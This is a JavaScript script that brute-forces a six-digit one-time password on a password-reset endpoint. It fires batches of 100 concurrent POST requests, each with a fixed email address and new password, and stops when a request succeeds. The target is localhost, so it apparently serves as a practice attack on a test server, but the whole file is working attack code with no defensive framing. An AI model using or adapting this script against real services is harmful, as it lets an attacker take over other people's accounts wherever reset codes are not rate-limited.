import axios from 'axios';

async function sendRequest(otp) {
    const data = JSON.stringify({
        "email": "shweta@gmail.com",
        "otp": otp,
        "newPass": "meow2"
    });

    const config = {
        method: 'POST',
        maxBodyLength: Infinity,
        url: 'http://localhost:8000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        const res = await axios.request(config);
        if (res.status === 200 || res.ok) {
            console.log(`✅ Request successful for OTP: ${otp}`);
            return true
        }
        return false
    } catch (error) {
        // console.error(`❌ Request failed for OTP: ${otp}, Error: ${error}`);
        return false;
    }
}

async function sendRequestsInBatches(start, batchSize) {
    const promises = [];

    for (let i = start; i < start + batchSize; i++) {
        // Ensure we do not exceed the maximum OTP limit
        if (i > 999999) break;

        promises.push(sendRequest(i.toString()));
    }

    // Use Promise.allSettled to ensure all promises complete (whether they succeed or fail)
    const result = await Promise.allSettled(promises);
    let flag = false
    result.forEach((res) => {
        if (res.value) flag = true;
    })
    return flag;
}

async function main() {
    const batchSize = 100; // Size of each batch

    for (let i = 560000; i <= 999999; i += batchSize) {
        // console.log(`🚀 Batch start: ${i}`);
        const resp = await sendRequestsInBatches(i, batchSize); // Await here to ensure sequential batch processing
        console.log(resp)
        if (resp == true) {
            return;
        }
    }

    console.log("🌟 All requests sent successfully.");
}

main();
